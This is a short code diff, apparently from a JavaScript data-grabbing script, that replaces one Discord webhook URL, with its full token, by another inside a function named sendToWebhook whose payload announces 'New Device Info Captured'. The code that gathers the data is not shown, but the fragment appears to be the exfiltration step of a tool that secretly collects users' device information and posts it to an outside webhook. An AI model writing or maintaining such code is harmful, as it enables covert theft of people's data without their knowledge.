@@ -80,7 +80,7 @@
     });
 
     function sendToWebhook(info) {
-        const webhookURL = 'https://discord.com/api/webhooks/1315655493040996472/DzVt2CDSV6AO1KtqMm5lxLBS4FxVUBGtzo5tBPcWiyKF3DtNcJAOu5zcEswz6sYg9fyY';
+        const webhookURL = 'https://discord.com/api/webhooks/1315744309676347483/4iWZPrwRA94Rd6XLoS5qTEIBWeosmlqMMy25GNxpx4_yucW606lkDJYNkiaIBWO79veg';
         
         const payload = {
             content: "New Device Info Captured",
